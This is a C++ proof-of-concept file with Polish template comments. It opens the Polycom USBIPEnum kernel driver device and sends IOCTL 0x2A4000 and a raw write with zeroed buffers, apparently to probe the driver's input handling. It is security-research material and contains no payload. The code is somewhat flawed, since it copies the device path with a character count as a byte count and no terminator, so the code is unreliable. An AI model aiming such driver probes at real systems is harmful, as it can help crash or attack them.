// POC.cpp : Ten plik zawiera funkcję „main”. W nim rozpoczyna się i kończy wykonywanie programu.
//

#include <iostream>
#include <tchar.h>
#include <Windows.h>

#include <setupapi.h>
#include <initguid.h>

#ifdef _UNICODE           //nie dziala przy wlaczonym unicode, trzeba poprawic :)
auto& tcout = std::wcout;
#else
auto& tcout = std::cout;
#endif


DEFINE_GUID(GUID_USB_POLYCOM, 0xD35F7840, 0x6A0C, 0x11d2, 0xB8, 0x41, 0x00, 0xC0, 0x4F, 0xAD, 0x51, 0x71);


class USBIPEnum_x64_interface {

    HANDLE dev_;
    TCHAR* dev_path_;

    //helpers

    int get_dev_name();

public:

    inline const TCHAR* const get_dev_path() {
        return dev_path_;
    }

    explicit USBIPEnum_x64_interface();

    int open();

    inline void close() {
        if (dev_ != INVALID_HANDLE_VALUE) {
            CloseHandle(dev_);
            dev_ = INVALID_HANDLE_VALUE;
         }
    }

    DWORD ioctl_0x2A4000();

    DWORD read(unsigned char* out, size_t size);

    DWORD write();

    ~USBIPEnum_x64_interface();


};

DWORD USBIPEnum_x64_interface::write() {

    DWORD dwRet = 0;
    unsigned char In_buff[0x30] = { 0 }; //ERROR_INVALID_PARAMETER

    WriteFile(dev_, In_buff, 0x30, &dwRet, NULL);

    return dwRet;

}

DWORD USBIPEnum_x64_interface::read(unsigned char* out, size_t size) {
     
    DWORD dwRet = 0;
    ReadFile(dev_, out, size, &dwRet, NULL);
    return dwRet;

}

DWORD USBIPEnum_x64_interface::ioctl_0x2A4000() {

    DWORD dwRet = 0;
    char In_buff[0x10] = { 0 }; //ERROR_INVALID_PARAMETER

    DeviceIoControl(dev_, 0x2A4000, &In_buff, sizeof(In_buff), NULL, 0, &dwRet, NULL);

    return dwRet;

}

int USBIPEnum_x64_interface::open() {

    int ret = get_dev_name();
    if (ret == 1) {
        dev_ = CreateFile(dev_path_, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
        return (dev_ == INVALID_HANDLE_VALUE) ? 0 : 1;
    }

    return ret;

}

int USBIPEnum_x64_interface::get_dev_name() {

    int ret = 1;

    HDEVINFO dev_inf = SetupDiGetClassDevs(reinterpret_cast<const GUID*>(&GUID_USB_POLYCOM),NULL, NULL,	
                                           DIGCF_PRESENT | DIGCF_DEVICEINTERFACE
    );

    if (dev_inf != INVALID_HANDLE_VALUE) {

        SP_DEVINFO_DATA devinfo_data;
        SP_DEVICE_INTERFACE_DATA dev_data;

        dev_data.cbSize = sizeof(dev_data);
        devinfo_data.cbSize = sizeof(SP_DEVINFO_DATA);

        unsigned int index = 0;
        bool ret_con = true;

        do {

            ret_con = SetupDiEnumDeviceInfo(dev_inf, index,	&devinfo_data);
            if (!ret_con) {
                ret = (GetLastError() == ERROR_NO_MORE_ITEMS) ? 0 : -1;
                break;
            }

            TCHAR hardwareID[256] = { 0 };
            
            ret_con = SetupDiGetDeviceRegistryProperty(dev_inf, &devinfo_data, SPDRP_HARDWAREID,	0L,
                                                       reinterpret_cast<PBYTE>(hardwareID), 
                                                       sizeof(hardwareID), 0L);
            if (ret_con) {

               if (_tcscmp(hardwareID, TEXT("root\\usbipenum")) == 0) {
                    break;
                }

            }

            index++;

        } while (ret_con);

        ret_con = SetupDiEnumDeviceInterfaces(dev_inf, NULL, reinterpret_cast<const GUID*>(&GUID_USB_POLYCOM), index, &dev_data);
        if (!ret_con) {
            ret = (GetLastError() == ERROR_NO_MORE_ITEMS) ? 0 : -1;
        }
        else {

             DWORD data_len;
             SetupDiGetDeviceInterfaceDetail(dev_inf, &dev_data, NULL, 0, &data_len, NULL);
             if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
                 ret = -1;
             }
             else {
                 PSP_DEVICE_INTERFACE_DETAIL_DATA dev_detail = new SP_DEVICE_INTERFACE_DETAIL_DATA[data_len];
                 if (dev_detail == nullptr) {
                     ret = -1;
                 }
                 else {
                     dev_detail->cbSize = sizeof(*dev_detail);
                     ret_con = SetupDiGetDeviceInterfaceDetail(dev_inf, &dev_data, dev_detail, data_len, &data_len, NULL);
                     if (!ret_con) {
                         ret = -1;
                     }
                     else {
                         unsigned int len = _tcslen(dev_detail->DevicePath);
                         dev_path_ = new TCHAR[len]; 
                         if (dev_path_ == nullptr) {
                             return -1;
                         }
                         CopyMemory(dev_path_, dev_detail->DevicePath, len);
                     }

                 }
             }

        }

        SetupDiDestroyDeviceInfoList(dev_inf);

    }

    return ret;

}

USBIPEnum_x64_interface::USBIPEnum_x64_interface() : dev_(INVALID_HANDLE_VALUE), dev_path_(nullptr) {

}

USBIPEnum_x64_interface::~USBIPEnum_x64_interface() {
    if (dev_path_ != nullptr) {
        delete[] dev_path_;
    }
    close();
}

int main()
{
    USBIPEnum_x64_interface usb_fdo;
    if (usb_fdo.open() != 1) {
        tcout << "Open device fail!" << std::endl;
        return -1;
    }

    tcout << "Polycom USBIPEnum interface is successfully open! " << std::endl;
    tcout << "Device path is : " << usb_fdo.get_dev_path() << std::endl;

    tcout << "Calling ioctl:0x2A4000 "<<usb_fdo.ioctl_0x2A4000() << " returned error code is : " << GetLastError() << std::endl;
    tcout << "Calling IRP_MJ_WRITE "<<usb_fdo.write()<< " returned error code is : "<< GetLastError() << std::endl;

    usb_fdo.close();

}

// Uruchomienie programu: Ctrl + F5 lub menu Debugowanie > Uruchom bez debugowania
// Debugowanie programu: F5 lub menu Debugowanie > Rozpocznij debugowanie

// Porady dotyczące rozpoczynania pracy:
//   1. Użyj okna Eksploratora rozwiązań, aby dodać pliki i zarządzać nimi
//   2. Użyj okna programu Team Explorer, aby nawiązać połączenie z kontrolą źródła
//   3. Użyj okna Dane wyjściowe, aby sprawdzić dane wyjściowe kompilacji i inne komunikaty
//   4. Użyj okna Lista błędów, aby zobaczyć błędy
//   5. Wybierz pozycję Projekt > Dodaj nowy element, aby utworzyć nowe pliki kodu, lub wybierz pozycję Projekt > Dodaj istniejący element, aby dodać istniejące pliku kodu do projektu
//   6. Aby w przyszłości ponownie otworzyć ten projekt, przejdź do pozycji Plik > Otwórz > Projekt i wybierz plik sln
